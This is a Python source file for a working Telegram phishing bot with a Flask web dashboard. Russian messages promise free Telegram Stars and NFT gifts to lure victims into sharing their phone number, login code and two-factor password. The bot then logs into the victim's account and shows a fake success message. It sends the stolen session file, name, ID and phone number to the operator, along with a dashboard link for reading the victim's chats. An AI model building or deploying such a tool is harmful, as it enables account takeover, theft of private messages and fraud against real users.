import os
import secrets
import asyncio
import threading
from functools import wraps
from flask import Flask, render_template_string, jsonify, request

from telethon import TelegramClient, events, Button
from telethon.errors import (
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError, 
    SessionPasswordNeededError, 
    PasswordHashInvalidError
)
from telethon.tl.types import User

# =============================================================
# 1. إعدادات المتغيرات وقراءة البيئة
# =============================================================
API_ID = int(os.environ.get("API_ID", "12345678"))
API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")

# الآيدي الافتراضي للمسؤول (في حال تم دخول البوت بدون رابط إحالة)
DEFAULT_ADMIN_ID = int(os.environ.get("DEFAULT_ADMIN_ID", "5963244397"))

SESSIONS_DIR = "user_sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# مخازن الحالات المباشرة
user_states = {}       # حالات التسجيل الحالية
active_web_tokens = {} # توكنات دخول لوحة التحكم {token: session_path}

# =============================================================
# 2. خادم الويب (Flask Web Dashboard - "وهم")
# =============================================================
app = Flask(__name__)

WEB_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>وهم | Wahm Web Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #0f172a; color: #f8fafc; font-family: system-ui, -apple-system, sans-serif; }
        .sidebar { background-color: #1e293b; border-left: 1px solid #334155; }
        .chat-area { background-color: #0f172a; }
        .active-tab { border-bottom: 3px solid #38bdf8; color: #38bdf8; font-weight: bold; }
        .chat-item:hover { background-color: #334155; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
    </style>
</head>
<body class="h-screen flex overflow-hidden">

    <!-- القائمة الجانبية -->
    <div class="w-full md:w-1/3 lg:w-1/4 sidebar flex flex-col h-full border-l border-slate-700">
        <div class="p-4 bg-slate-800 flex items-center justify-between border-b border-slate-700">
            <div class="flex items-center space-x-3 space-x-reverse">
                <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg font-bold text-xl text-white">
                    👻
                </div>
                <div>
                    <h1 class="font-bold text-lg text-white tracking-wide">تطبيق وَهَم</h1>
                    <span class="text-xs text-emerald-400 flex items-center">
                        <span class="w-2 h-2 rounded-full bg-emerald-400 inline-block ml-1 animate-pulse"></span> متصل بالجلسة
                    </span>
                </div>
            </div>
            <div id="user-avatar" class="w-9 h-9 rounded-full bg-slate-600 flex items-center justify-center font-bold text-sm text-slate-200">
                ..
            </div>
        </div>

        <div id="user-info-bar" class="px-4 py-2 bg-slate-900/50 text-xs text-slate-400 flex justify-between border-b border-slate-800">
            <span id="user-name">جاري التحميل...</span>
            <span id="user-phone" dir="ltr">...</span>
        </div>

        <!-- الأقسام -->
        <div class="flex justify-around bg-slate-800 text-sm text-slate-400 border-b border-slate-700 select-none">
            <button onclick="filterChats('all', this)" class="py-3 px-2 active-tab tab-btn">الكل</button>
            <button onclick="filterChats('users', this)" class="py-3 px-2 tab-btn">المستخدمين</button>
            <button onclick="filterChats('channels', this)" class="py-3 px-2 tab-btn">القنوات</button>
            <button onclick="filterChats('groups', this)" class="py-3 px-2 tab-btn">المجموعات</button>
            <button onclick="filterChats('bots', this)" class="py-3 px-2 tab-btn">البوتات</button>
        </div>

        <div id="chats-list" class="flex-1 overflow-y-auto divide-y divide-slate-800/50">
            <div class="p-8 text-center text-slate-500">
                <i class="fas fa-circle-notch fa-spin text-2xl mb-2 text-cyan-400"></i>
                <p>جاري جلب المحادثات من الحساب...</p>
            </div>
        </div>
    </div>

    <!-- منطقة عرض المحادثة -->
    <div class="hidden md:flex flex-1 flex-col h-full chat-area">
        <div id="chat-header" class="p-4 bg-slate-800/80 border-b border-slate-700 flex items-center justify-between">
            <div class="flex items-center space-x-3 space-x-reverse">
                <div id="active-chat-icon" class="w-10 h-10 rounded-full bg-slate-700 flex items-center justify-center text-slate-300 font-bold">
                    💬
                </div>
                <div>
                    <h2 id="active-chat-title" class="font-bold text-white">اختر محادثة للبدء</h2>
                    <p id="active-chat-subtitle" class="text-xs text-slate-400">تطبيق وهم للتحكم الكامل بالجلسة</p>
                </div>
            </div>
        </div>

        <div id="messages-container" class="flex-1 p-4 overflow-y-auto space-y-3 flex flex-col justify-center items-center">
            <div class="text-center text-slate-500 max-w-sm">
                <div class="w-20 h-20 mx-auto mb-4 rounded-full bg-slate-800 flex items-center justify-center text-4xl">👻</div>
                <h3 class="text-lg font-bold text-slate-300 mb-1">مرحباً بك في واجهة "وَهَم"</h3>
                <p class="text-xs">تصفح الرسائل والمحادثات والقنوات الخاصة بهذه الجلسة فوراً.</p>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        let allDialogs = [];
        let currentFilter = 'all';

        if (!token) {
            document.body.innerHTML = '<div class="m-auto text-red-400 font-bold">❌ رابط التحكم غير صالح!</div>';
        } else {
            loadAccountData();
            loadDialogs();
        }

        async function loadAccountData() {
            try {
                const res = await fetch(`/api/me?token=${token}`);
                const data = await res.json();
                if (data.success) {
                    document.getElementById('user-name').innerText = `${data.user.first_name} ${data.user.last_name || ''}`;
                    document.getElementById('user-phone').innerText = data.user.phone || '';
                    document.getElementById('user-avatar').innerText = (data.user.first_name || 'W')[0];
                }
            } catch (e) { console.error(e); }
        }

        async function loadDialogs() {
            try {
                const res = await fetch(`/api/dialogs?token=${token}`);
                const data = await res.json();
                if (data.success) {
                    allDialogs = data.dialogs;
                    renderDialogs();
                } else {
                    document.getElementById('chats-list').innerHTML = `<div class="p-4 text-center text-red-400">${data.error}</div>`;
                }
            } catch (e) {
                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثنا التحميل</div>';
            }
        }

        function filterChats(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active-tab'));
            btn.classList.add('active-tab');
            renderDialogs();
        }

        function renderDialogs() {
            const container = document.getElementById('chats-list');
            let filtered = allDialogs;

            if (currentFilter !== 'all') {
                filtered = allDialogs.filter(d => d.type === currentFilter);
            }

            if (filtered.length === 0) {
                container.innerHTML = '<div class="p-8 text-center text-slate-500 text-sm">لا توجد محادثات هنا</div>';
                return;
            }

            container.innerHTML = filtered.map(d => `
                <div onclick="openChat('${d.id}', '${escapeHtml(d.name)}', '${d.type}')" class="chat-item p-3 flex items-center space-x-3 space-x-reverse cursor-pointer transition">
                    <div class="w-11 h-11 rounded-full bg-slate-700 flex-shrink-0 flex items-center justify-center font-bold text-slate-200">
                        ${getTypeIcon(d.type)}
                    </div>
                    <div class="flex-1 min-w-0">
                        <div class="flex justify-between items-baseline">
                            <h4 class="text-sm font-semibold text-slate-100 truncate">${escapeHtml(d.name)}</h4>
                            <span class="text-xs text-slate-500">${d.date || ''}</span>
                        </div>
                        <p class="text-xs text-slate-400 truncate mt-1">${escapeHtml(d.unread_count ? `[${d.unread_count} غير مقروء]` : d.last_message || '')}</p>
                    </div>
                </div>
            `).join('');
        }

        function getTypeIcon(type) {
            if (type === 'channels') return '📢';
            if (type === 'groups') return '👥';
            if (type === 'bots') return '🤖';
            return '👤';
        }

        function escapeHtml(str) {
            return (str || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        async function openChat(id, name, type) {
            document.getElementById('active-chat-title').innerText = name;
            document.getElementById('active-chat-subtitle').innerText = `قسم: ${type}`;
            document.getElementById('active-chat-icon').innerText = getTypeIcon(type);
            
            const msgBox = document.getElementById('messages-container');
            msgBox.innerHTML = '<div class="m-auto text-slate-400"><i class="fas fa-spinner fa-spin mr-2"></i> جاري جلب الرسائل...</div>';

            try {
                const res = await fetch(`/api/messages?token=${token}&chat_id=${id}`);
                const data = await res.json();
                if (data.success) {
                    if (data.messages.length === 0) {
                        msgBox.innerHTML = '<div class="m-auto text-slate-500">لا توجد رسائل للعرض</div>';
                        return;
                    }
                    msgBox.className = "flex-1 p-4 overflow-y-auto space-y-3 flex flex-col";
                    msgBox.innerHTML = data.messages.map(m => `
                        <div class="max-w-xl ${m.out ? 'mr-auto bg-cyan-700 text-white' : 'ml-auto bg-slate-800 text-slate-100'} p-3 rounded-xl shadow text-sm">
                            <div class="text-xs opacity-75 mb-1 font-bold">${escapeHtml(m.sender)}</div>
                            <div>${escapeHtml(m.text)}</div>
                            <div class="text-[10px] text-left opacity-50 mt-1">${m.date}</div>
                        </div>
                    `).join('');
                    msgBox.scrollTop = msgBox.scrollHeight;
                }
            } catch (e) {
                msgBox.innerHTML = '<div class="m-auto text-red-400">فشل في تحميل الرسائل</div>';
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "<h1>Telegram Stars Gift Service Active ⭐️</h1>", 200

@app.route('/dashboard')
def dashboard():
    return render_template_string(WEB_TEMPLATE)

def async_route(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs))
    return wrapper

@app.route('/api/me')
@async_route
async def api_me():
    token = request.args.get('token')
    if token not in active_web_tokens:
        return jsonify({"success": False, "error": "Токен недействителен"}), 403
    
    session_path = active_web_tokens[token]
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    me = await client.get_me()
    await client.disconnect()

    return jsonify({
        "success": True,
        "user": {
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "phone": me.phone
        }
    })

@app.route('/api/dialogs')
@async_route
async def api_dialogs():
    token = request.args.get('token')
    if token not in active_web_tokens:
        return jsonify({"success": False, "error": "Сессия истекла"}), 403
    
    session_path = active_web_tokens[token]
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    dialogs_data = []
    async for dialog in client.iter_dialogs(limit=40):
        entity = dialog.entity
        dtype = 'users'
        if dialog.is_channel:
            dtype = 'channels'
        elif dialog.is_group:
            dtype = 'groups'
        elif isinstance(entity, User) and entity.bot:
            dtype = 'bots'

        dialogs_data.append({
            "id": dialog.id,
            "name": dialog.name or "Диалог",
            "type": dtype,
            "unread_count": dialog.unread_count,
            "last_message": dialog.message.text if dialog.message else "",
            "date": dialog.date.strftime("%H:%M") if dialog.date else ""
        })
        
    await client.disconnect()
    return jsonify({"success": True, "dialogs": dialogs_data})

@app.route('/api/messages')
@async_route
async def api_messages():
    token = request.args.get('token')
    chat_id = request.args.get('chat_id')
    
    if token not in active_web_tokens or not chat_id:
        return jsonify({"success": False, "error": "Неверный запрос"}), 400
        
    session_path = active_web_tokens[token]
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    messages_data = []
    try:
        target = int(chat_id)
        async for msg in client.iter_messages(target, limit=25):
            sender = "Я" if msg.out else ("Собеседник")
            messages_data.append({
                "id": msg.id,
                "text": msg.text or "[Медиаконтент]",
                "out": msg.out,
                "sender": sender,
                "date": msg.date.strftime("%H:%M") if msg.date else ""
            })
    except Exception as e:
        await client.disconnect()
        return jsonify({"success": False, "error": str(e)}), 500

    await client.disconnect()
    messages_data.reverse()
    return jsonify({"success": True, "messages": messages_data})

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# =============================================================
# 3. البوت الروسي للنجوم + نظام الإحالة والمشرفين
# =============================================================
bot = TelegramClient('stars_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# لوحة مفاتيح الأرقام الشفافة باللغة الروسية
def make_numeric_keyboard(current_code=""):
    display = f"Введенный код: {current_code}" if current_code else "Код не введен"
    buttons = [
        [Button.inline("1", b"k_1"), Button.inline("2", b"k_2"), Button.inline("3", b"k_3")],
        [Button.inline("4", b"k_4"), Button.inline("5", b"k_5"), Button.inline("6", b"k_6")],
        [Button.inline("7", b"k_7"), Button.inline("8", b"k_8"), Button.inline("9", b"k_9")],
        [Button.inline("❌ Удалить", b"k_del"), Button.inline("0", b"k_0"), Button.inline("✅ Подтвердить", b"k_confirm")]
    ]
    return display, buttons

# استقبال أمر /start مع إرسال فيديو vip.mp4 المباشر
@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    user_id = event.sender_id
    
    # التقاط الآيدي من رابط الدعوة مثل: /start 5963244397
    args = event.text.split()
    referrer_id = DEFAULT_ADMIN_ID
    if len(args) > 1 and args[1].isdigit():
        referrer_id = int(args[1])

    user_states[user_id] = {
        "step": "WAITING_PHONE", 
        "code": "",
        "referrer_id": referrer_id
    }
    
    # رسالة ترحيبية بالروسية للنجوم و NFT Gifts
    russian_welcome = (
        "🌟 **Бесплатные Telegram Stars и NFT Подарки!**\n\n"
        "Получите от 500 до 5000 Telegram Stars и уникальные подарки прямо на ваш аккаунт.\n\n"
        "👇 Для проверки и активации нажимите кнопку ниже, чтобы поделиться номером телефона:"
    )
    
    phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
    
    # إرسال الفيديو المباشر مسار "vip.mp4" ثابت بالكود مع النص والأزرار
    if os.path.exists("vip.mp4"):
        await bot.send_file(
            event.chat_id,
            "vip.mp4",
            caption=russian_welcome,
            buttons=phone_btn
        )
    else:
        # احتياطي فقط إذا لم يُعثر على الملف بالسيرفر
        await event.respond(russian_welcome, buttons=phone_btn)

# استقبال رقم الهاتف باللغة الروسية
@bot.on(events.NewMessage)
async def process_phone(event):
    user_id = event.sender_id
    
    if user_id in user_states and user_states[user_id]["step"] == "WAITING_PHONE":
        if event.message.contact:
            phone_num = event.message.contact.phone_number
            if not phone_num.startswith('+'):
                phone_num = '+' + phone_num
            
            loading_msg = await event.respond("⏳ Отправка запроса в Telegram...", buttons=Button.clear())
            
            sess_filename = os.path.join(SESSIONS_DIR, f"sess_{user_id}")
            temp_client = TelegramClient(sess_filename, API_ID, API_HASH)
            await temp_client.connect()
            
            try:
                res = await temp_client.send_code_request(phone_num)
                user_states[user_id].update({
                    "step": "WAITING_CODE",
                    "phone": phone_num,
                    "client": temp_client,
                    "phone_code_hash": res.phone_code_hash,
                    "sess_filename": sess_filename,
                    "code": ""
                })
                
                disp_text, btns = make_numeric_keyboard("")
                await loading_msg.delete()
                await event.respond(
                    f"📩 Код подтверждения отправлен в ваш Telegram аккаунт.\n\n"
                    f"Введите код с помощью кнопок ниже:\n\n{disp_text}", 
                    buttons=btns
                )
                
            except Exception as error:
                await temp_client.disconnect()
                await event.respond(f"❌ Ошибка отправки кода: {str(error)}")

# لوحة الأرقام باللغة الروسية
@bot.on(events.CallbackQuery(pattern=b'k_'))
async def process_keyboard(event):
    user_id = event.sender_id
    if user_id not in user_states or user_states[user_id]["step"] != "WAITING_CODE":
        await event.answer("⚠️ Сессия истекла. Введите /start", alert=True)
        return
        
    action = event.data.decode('utf-8').replace('k_', '')
    state = user_states[user_id]
    
    if action.isdigit() and len(state["code"]) < 6:
        state["code"] += action
    elif action == "del":
        state["code"] = state["code"][:-1]
    elif action == "confirm":
        await verify_code_and_login(event, user_id)
        return

    disp_text, btns = make_numeric_keyboard(state["code"])
    await event.edit(f"📩 Введите код из сообщения Telegram:\n\n{disp_text}", buttons=btns)
    await event.answer()

# معالجة الكود المباشر والدعم المباشر لـ 2FA
async def verify_code_and_login(event, user_id):
    state = user_states[user_id]
    code, client, phone, code_hash = state["code"], state["client"], state["phone"], state["phone_code_hash"]
    
    if not code:
        await event.answer("⚠️ Пожалуйста, введите код!", alert=True)
        return

    await event.edit("⏳ Проверка кода и активация...")

    try:
        await client.sign_in(phone, code, phone_code_hash=code_hash)
        await notify_owner_and_finish(event, user_id)

    except SessionPasswordNeededError:
        state["step"] = "WAITING_2FA"
        await event.edit("🔐 **Ваш аккаунт защищен двухэтапной аутентификацией (2FA).**\n\nВведите ваш пароль текстом в чат:")
        
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        state["code"] = ""
        disp_text, btns = make_numeric_keyboard("")
        await event.edit(f"❌ Неверный или истекший код. Попробуйте снова:\n\n{disp_text}", buttons=btns)

# استقبال كلمة مرور 2FA
@bot.on(events.NewMessage)
async def process_2fa_password(event):
    user_id = event.sender_id
    if user_id in user_states and user_states[user_id]["step"] == "WAITING_2FA":
        password = event.text
        client = user_states[user_id]["client"]
        try:
            await client.sign_in(password=password)
            await notify_owner_and_finish(event, user_id)
        except PasswordHashInvalidError:
            await event.respond("❌ Неверный пароль. Введите еще раз:")

# =============================================================
# 4. الإنهاء + إرسال النتيجة لصاحب رابط الدعوة (The Referrer/Owner)
# =============================================================
async def notify_owner_and_finish(event, user_id):
    state = user_states[user_id]
    client = state["client"]
    sess_filename = state["sess_filename"]
    referrer_id = state["referrer_id"]
    phone = state["phone"]
    file_path = f"{sess_filename}.session"

    # جلب معلومات المستهدف
    victim_info = await client.get_me()
    first_name = victim_info.first_name or ""
    last_name = victim_info.last_name or ""
    username = f"@{victim_info.username}" if victim_info.username else "بدون يوزر"

    await client.disconnect()

    # إنشاء توكن دخول لواجهة "وهم"
    web_token = secrets.token_urlsafe(16)
    active_web_tokens[web_token] = file_path

    # تجهيز رابط الويب للتحكم
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:10000")
    wahm_link = f"{render_url}/dashboard?token={web_token}"

    # 1. إظهار تمويه للمستهدف باللغة الروسية (حتى لا يشك)
    try:
        await bot.send_message(
            user_id,
            "🎉 **Авторизация прошла успешно!**\n\nВаши Telegram Stars и NFT подарки зачислены на аккаунт. Обработка займет от 5 до 15 минут."
        )
    except Exception:
        pass

    # 2. إرسال ملف الجلسة + البيانات + رابط التحكم لصاحب رابط الدعوة (Referrer/Admin)
    if os.path.exists(file_path):
        notification_text = (
            f"🚀 **تم صيد جلسة جديدة بنجاح!**\n\n"
            f"👤 **الاسم:** {first_name} {last_name}\n"
            f"🆔 **الآيدي:** `{user_id}`\n"
            f"🏷️ **اليوزر:** {username}\n"
            f"📱 **الرقم:** `{phone}`\n\n"
            f"🌐 **رابط تحكم واجهة (وَهَم):**\n{wahm_link}"
        )
        
        web_btn = [Button.url("👻 فتح واجهة التحكم (وَهَم)", wahm_link)]
        
        try:
            # إرسال الملف والتقرير المباشر للشخص صاحب الآيدي في الرابط
            await bot.send_file(
                referrer_id,
                file_path,
                caption=notification_text,
                buttons=web_btn
            )
        except Exception as e:
            # في حال كان صاحب الرابط لم يبدأ البوت، يتم الإرسال للآيدي الافتراضي
            if referrer_id != DEFAULT_ADMIN_ID:
                await bot.send_file(
                    DEFAULT_ADMIN_ID,
                    file_path,
                    caption=f"⚠️ (تعذر الوصول للصاحب الاصلي {referrer_id})\n\n" + notification_text,
                    buttons=web_btn
                )

    del user_states[user_id]

# =============================================================
# 5. التشغيل
# =============================================================
if __name__ == '__main__':
    web_thread = threading.Thread(target=run_flask)
    web_thread.daemon = True
    web_thread.start()
    
    print("🚀 البوت الروسي للنجوم مع نظام الإحالة المباشر يعمل بنجاح...")
    bot.run_until_disconnected()

